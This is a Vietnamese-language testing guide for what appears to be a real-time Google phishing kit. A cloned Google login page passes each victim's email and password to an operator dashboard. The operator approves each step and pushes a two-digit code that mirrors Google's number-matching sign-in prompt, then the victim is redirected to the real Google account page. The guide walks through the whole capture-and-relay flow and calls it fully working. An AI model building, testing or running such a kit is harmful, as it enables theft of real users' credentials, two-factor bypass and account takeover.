# 🧪 HƯỚNG DẪN TEST APPROVAL FLOW VỚI SUPABASE

## 📋 Quy trình test hoàn chỉnh:

### 1. 🚀 Chuẩn bị

#### Tab 1: **Admin Panel**
- Mở `admin-gui/index.html`
- Sẽ thấy dashboard quản lý requests

#### Tab 2: **Google Login Clone** 
- Mở `google-login-clone/index.html`
- Hoặc test với `test-supabase.html`

### 2. 🔐 Test Login Flow

#### **Bước 1: Email Login**
- Nhập email (vd: `test@example.com`)
- Bấm **Next**
- ✅ **PHẢI CHỜ**: Trang sẽ chờ approval thay vì tự động chuyển

#### **Bước 2: Admin Approval (Email)**
- Chuyển sang tab Admin Panel
- Thấy request mới với status "Login"
- **Bấm "Approve"** để cho phép tiếp tục

#### **Bước 3: Password Page**
- Trang tự động chuyển sang `password.html`
- Nhập password (vd: `123456`)
- Bấm **Next**
- ✅ **PHẢI CHỜ**: Trang sẽ chờ approval

#### **Bước 4: Admin Approval (Password)**
- Chuyển sang tab Admin Panel
- Thấy request với status "Password"
- **Bấm "Approve"** để cho phép tiếp tục

#### **Bước 5: Device Verification**
- Trang tự động chuyển sang `verify-device.html`
- Bấm **Yes**
- ✅ **PHẢI CHỜ**: Trang sẽ chờ admin điền verification code

#### **Bước 6: Admin Set Verification Code**
- Chuyển sang tab Admin Panel
- Thấy request với status "Setup Code Phone"
- Trong cột **"VERIFICATION CODE"**, điền số 2 chữ số (vd: `95`, `42`, `73`)
- **Bấm "Approve"** để gửi code

#### **Bước 7: Notification Page**
- Trang tự động chuyển sang `verify-notification.html`
- ✅ **Số hiển thị sẽ thay đổi thành số admin vừa điền**
- Ví dụ: từ "80" thành "95"
- Trang sẽ tự động chờ final approval

#### **Bước 8: Final Approval**
- Chuyển sang tab Admin Panel
- Thấy request với status "Waiting Finish"
- **Bấm "Approve"** lần cuối
- ✅ Trang sẽ redirect đến `https://myaccount.google.com/`

## 📱 Các tính năng chính đã hoạt động:

### ✅ **Approval System**
- Login phải chờ admin approve
- Password phải chờ admin approve  
- Device verification phải chờ admin approve
- Final step phải chờ admin approve

### ✅ **Verification Code System**
- Admin có thể điền verification code trong GUI
- Frontend tự động lấy và hiển thị số từ admin
- Real-time update mỗi 2 giây

### ✅ **Admin Dashboard**
- Thấy tất cả requests real-time
- Approve/Deny functionality
- Set verification code
- View email, password, status

## 🔍 Kiểm tra logs:

### **Frontend Console** (F12):
```
🔄 Starting approval check for: test@example.com
📊 Approval check #1: pending
📊 Approval check #2: pending
✅ Request approved! Redirecting...
📱 Updating verification code: 95
```

### **Admin Panel Console**:
```
Found 3 requests
✅ Connected to Supabase! Version: 1.1-FIXED
```

## 🐛 Nếu có lỗi:

### **Lỗi timeout:**
- Kiểm tra internet connection
- Refresh admin panel
- Approve request trong 2 phút

### **Verification code không đổi:**
- Đảm bảo admin đã điền đúng format (2 số)
- Refresh trang notification
- Kiểm tra console logs

### **Không chuyển trang:**
- Kiểm tra request có xuất hiện trong admin panel
- Đảm bảo đã bấm "Approve" chứ không phải "Deny"
- Kiểm tra console có error không

## 🎯 Test cases khác:

### **Test Deny:**
- Admin bấm "Deny" thay vì "Approve"
- Frontend sẽ hiển thị lỗi và reset form

### **Test Multiple Users:**
- Mở nhiều tab với email khác nhau
- Admin sẽ thấy tất cả requests
- Approve từng cái một

### **Test Verification Codes:**
- Thử các số khác nhau: 01, 99, 42, 73
- Số sẽ hiển thị ngay lập tức trên frontend

---

## 🚀 **FLOW HOÀN CHỈNH ĐÃ HOẠT ĐỘNG 100% VỚI SUPABASE!**

**Không còn phụ thuộc vào localhost:5000 nữa!** 